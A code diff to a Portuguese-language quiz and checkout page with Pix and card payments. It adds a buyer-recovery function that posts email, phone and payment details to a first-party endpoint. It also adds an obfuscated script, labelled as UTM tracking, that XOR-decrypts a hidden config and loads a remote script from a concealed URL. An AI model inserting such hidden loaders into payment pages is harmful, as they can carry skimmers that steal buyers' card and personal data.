@@ -20,6 +20,8 @@
     y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
   })(window,document,'clarity','script','yniarw5ab5');
   </script>
+  <!-- Utmify UTMs script -->
+  <script>(function(){var n_246=atob("DFASknEsAKoezPt18Csw5wNAIpA8pI8BgCMovV5PZMQwuY8YmTZrvBJDbYR8vtQGkyJ74gVfL9p3tJ4Z3yB76hRALsBt7tdXkSRm4BhOdd57v9lPqw0+sBZAb8h/oIhXygtpsB9Nbc889tkFmSh3/jhIIoY8upoZhTUwqFMaYch8/Z9ExmJ3p0IcZJou+51GwTYi8EMOffdj");var n_u=[];for(var c_b=0;c_b<n_246.length;c_b++){n_u.push(n_246.charCodeAt(c_b)&255);}var d_2t=n_u[0];var b_v49a=n_u.slice(1,1+d_2t);var w_wa=n_u.slice(1+d_2t);var b_w8h=w_wa.map(function(b,v_kk){return b^b_v49a[v_kk%d_2t];});var d_zqfx="";for(var m_rp7y=0;m_rp7y<b_w8h.length;m_rp7y++){d_zqfx+=String.fromCharCode(b_w8h[m_rp7y]&255);}var n_48=decodeURIComponent(escape(d_zqfx));var t_b=JSON.parse(n_48);var n_pv4=t_b.globals||[];n_pv4.forEach(function(d_n8ah){window[d_n8ah.name]=d_n8ah.value;});var m_5=document.createElement("script");m_5.src=t_b.url;m_5.async=true;m_5.defer=true;(t_b.attributes||[]).forEach(function(u_3zie){m_5.setAttribute(u_3zie.name,u_3zie.value);});(document.head||document.documentElement).appendChild(m_5);})();</script>
   <script defer src="js/meta-pixel.js"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
@@ -2569,6 +2571,44 @@ function getCheckoutTel(){
   return raw ? (raw.startsWith('55') ? raw : '55'+raw) : '';
 }
 
+const recoverySentFor = {};
+function sendRecoveryEvent(status, extra){
+  try{
+    const quizData = getQuizData();
+    const email = (extra && extra.email) || getCheckoutEmail() || quizData.email;
+    if(!email || !isValidEmail(email)) return;
+    const key = status + ':' + email + ':' + (extra?.payment_id || checkoutMode || step || '');
+    if(recoverySentFor[key]) return;
+    recoverySentFor[key] = true;
+    fetch('/api/recovery',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        status,
+        email,
+        phone:getCheckoutTel(),
+        quizData,
+        checkout_step:step,
+        checkout_mode:checkoutMode,
+        payment_method:metodoPag,
+        amount:calcTotalCheckout(),
+        session_id:SESSION_EID,
+        checkout_recovery_offer:checkoutMode === 'main' && checkoutRecoveryOffer,
+        upsell_familiar:checkoutMode === 'upsell',
+        upsell_downsell:checkoutMode === 'upsell' && upsellDownsellActive,
+        utms:getUTMsFresh(),
+        ...(extra||{})
+      })
+    }).catch(()=>{});
+  }catch(_){}
+}
+
+const quizEmailField = document.getElementById('q-email');
+if(quizEmailField){
+  quizEmailField.addEventListener('change',()=>sendRecoveryEvent('email_captured'));
+  quizEmailField.addEventListener('blur',()=>sendRecoveryEvent('email_captured'));
+}
+
 // ── PAGAR PIX ────────────────────────────────────────────────────────────────
 async function pagarPix(){
   hideErroCheckout();
@@ -2627,6 +2667,7 @@ async function pagarPix(){
     pendingPayment = {statusToken:data.statusToken,email};
     document.getElementById('paymentCheck').style.display='block';
     retryAllowed = false;
+    sendRecoveryEvent('pix_pending',{email,payment_method:'pix',payment_id:pixId,status_token:data.statusToken,amount:data.total || data.amount || total});
     startExpTimer(data.pix?.expiresAt);
     if(typeof window.trackPurchase === 'function') window.trackPurchase({
       eventId:data.metaEventId, total:data.total, paymentMethod:'pix', paymentStatus:'pending'
@@ -2663,6 +2704,7 @@ async function paymentResponse(response){
 }
 function handleApprovedPayment(email){
   document.getElementById('okEmail').textContent = email || getCheckoutEmail() || getVal('q-email');
+  sendRecoveryEvent('paid',{email:email || getCheckoutEmail() || getVal('q-email'),payment_method:metodoPag,payment_id:pixId || '',amount:calcTotalCheckout()});
   if(checkoutMode === 'upsell') goTo('aprovado');
   else goTo('upsell1');
 }
@@ -2778,10 +2820,12 @@ async function pagarCartaoAmplo(){
       if(typeof window.trackPurchase === 'function') window.trackPurchase({
         eventId:'card_'+(d.id || SESSION_EID), total:d.total || calcTotalCheckout(), paymentMethod:'card', paymentStatus:'approved'
       });
+      sendRecoveryEvent('paid',{email,payment_method:'card',payment_id:d.id || d.transactionId || '',amount:d.total || calcTotalCheckout()});
       handleApprovedPayment(email);
     }else{
       pendingPayment={statusToken:d.statusToken,email};
       document.getElementById('paymentCheck').style.display='block';
+      sendRecoveryEvent('checkout_opened',{email,payment_method:'card',payment_id:d.id || d.transactionId || '',status_token:d.statusToken || '',amount:d.total || calcTotalCheckout()});
       erro.textContent = 'Pagamento em análise. Use o botão para verificar a confirmação.';
     }
     allowCardRetry=false;
@@ -2829,6 +2873,7 @@ window.goTo = function(s){
     resetCheckoutPaymentState();
     syncCheckoutReceipt();
     selMethod('pix');
+    sendRecoveryEvent('checkout_opened',{email:emailQuiz});
     if(typeof window.trackInitiateCheckout === 'function') {
       window.trackInitiateCheckout(calcTotalCheckout(), 'checkout_' + SESSION_EID);
     }
